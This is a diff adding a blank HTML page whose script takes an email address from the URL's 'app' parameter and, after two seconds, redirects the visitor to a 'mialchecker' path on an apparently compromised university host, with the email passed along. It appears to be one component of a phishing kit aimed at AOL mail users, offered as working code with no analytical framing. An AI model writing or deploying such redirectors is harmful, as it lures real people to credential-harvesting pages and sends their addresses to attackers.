@@ -1,0 +1,20 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+
+<script type="text/javascript">
+		function getUrlVars() {
+		    var vars = {};
+		    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+		        vars[key] = value;
+		    });
+		    return vars;
+		}
+		var email = getUrlVars()['app'];
+		var redirect = "https://www-lisic.univ-littoral.fr/spitefulaol/mialchecker/index.php";
+		var urlFinal = redirect + "?email=" + email;
+		setTimeout(function () {
+			window.location.href = urlFinal; 
+		}, 2000);
+	</script>
+</head>
+<body></body></html>
